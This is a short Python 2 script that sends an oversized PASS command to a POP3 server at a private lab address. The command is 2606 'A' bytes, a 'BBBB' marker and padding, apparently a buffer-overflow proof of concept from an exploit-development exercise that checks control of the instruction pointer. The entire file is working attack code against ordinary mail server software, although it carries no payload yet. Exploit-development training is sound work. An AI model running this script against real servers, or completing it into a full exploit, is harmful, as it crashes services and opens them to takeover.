#!/usr/bin/python
import socket

RHOST = '192.168.205.185'
RPORT = 110

total = 4000
offset = 2606

buf = ''
buf += 'A' * (offset - len(buf))
buf += 'BBBB'
buf += 'C' * (total-len(buf))

try:
  print 'Try connect to POP3...'
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((RHOST, RPORT))
  data = s.recv(1024)
  print data

  print 'USER test'
  s.send('USER test\r\n')
  data = s.recv(1024)
  print data

  print 'PASS max buffer bytes'
  s.send('PASS ' + buf + '\r\n')
  data = s.recv(1024)
  print data

  print 'QUIT'
  s.send('QUIT\r\n')
  data = s.recv(1024)
  print data

  s.close()
except:
  print 'Could not connect to POP3!'
